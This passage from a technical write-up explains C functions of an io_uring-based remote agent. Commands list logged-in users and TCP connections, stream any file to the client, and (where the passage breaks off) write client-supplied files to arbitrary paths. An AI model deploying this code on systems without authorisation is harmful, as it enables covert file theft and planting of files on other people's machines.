<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">recv_all</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_prep_recv</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_submit</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.</p>
<p>It obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.</p>
<p>It then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.</p>
<p><code>read_file_uring</code>:</p>
<p>This function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.</p>
<p>Each block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.</p>
<p><code>cmd_users</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cmd_users</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">read_file_uring</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="s">&#34;/var/run/utmp&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">err</span> <span class="o">=</span> <span class="s">&#34;Error reading /var/run/utmp</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">err</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">err</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">utmp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">utmp</span> <span class="o">*</span><span class="n">entries</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">utmp</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">out_pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">out_pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">out_pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">out_pos</span><span class="p">,</span> <span class="s">&#34;Logged users:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">entries</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ut_type</span> <span class="o">==</span> <span class="n">USER_PROCESS</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">out_pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">out_pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">out_pos</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                <span class="s">&#34;%-8s %-8s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">entries</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ut_user</span><span class="p">,</span> <span class="n">entries</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ut_line</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">out_pos</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">out_pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.</p>
<p><code>cmd_ss</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cmd_ss</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">read_file_uring</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="s">&#34;/proc/net/tcp&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">err</span> <span class="o">=</span> <span class="s">&#34;Error reading /proc/net/tcp</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">err</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">err</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16384</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">out_pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">out_pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">out_pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">out_pos</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="s">&#34;Local Address          Remote Address         State  UID</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">line</span> <span class="o">=</span> <span class="nf">strtok</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="nf">strtok</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sl</span><span class="p">,</span> <span class="n">local_ip</span><span class="p">,</span> <span class="n">local_port</span><span class="p">,</span> <span class="n">rem_ip</span><span class="p">,</span> <span class="n">rem_port</span><span class="p">,</span> <span class="n">st</span><span class="p">,</span> <span class="n">uid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sscanf</span><span class="p">(</span><span class="n">line</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s">&#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="o">&amp;</span><span class="n">sl</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">local_ip</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">local_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rem_ip</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rem_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">local_str</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span> <span class="n">rem_str</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">local_str</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">local_str</span><span class="p">),</span> <span class="s">&#34;%d.%d.%d.%d:%d&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="p">(</span><span class="n">local_ip</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">),</span> <span class="p">(</span><span class="n">local_ip</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="p">(</span><span class="n">local_ip</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="p">(</span><span class="n">local_ip</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">local_port</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">rem_str</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rem_str</span><span class="p">),</span> <span class="s">&#34;%d.%d.%d.%d:%d&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="p">(</span><span class="n">rem_ip</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">),</span> <span class="p">(</span><span class="n">rem_ip</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="p">(</span><span class="n">rem_ip</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="p">(</span><span class="n">rem_ip</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">rem_port</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">out_pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">out_pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">out_pos</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="s">&#34;%-22s %-22s %-5X %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">local_str</span><span class="p">,</span> <span class="n">rem_str</span><span class="p">,</span> <span class="n">st</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">out_pos</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="nf">strtok</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">out_pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.</p>
<p><code>cmd_get</code>;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cmd_get</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_prep_openat</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_submit</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">err</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">err</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">err</span><span class="p">),</span> <span class="s">&#34;Failed to open %s: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">fd</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">err</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">err</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">off_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_prep_read</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_submit</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">=</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">offset</span> <span class="o">+=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ret</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.</p>
<p><code>cmd_recv</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cmd_recv</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">remote_path</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">expected_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">sscanf</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="s">&#34;%255s %ld&#34;</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">expected_size</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span> <span class="o">||</span> <span class="n">expected_size</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span> <span class="o">=</span> <span class="s">&#34;Usage: recv &lt;remote_path&gt; &lt;size&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_prep_openat</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_submit</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">err</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">err</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">err</span><span class="p">),</span> <span class="s">&#34;Failed to open %s: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">fd</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">err</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">err</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">off_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&lt;</span> <span class="n">expected_size</span><span class="p">)</span> <span class="p">{</span>
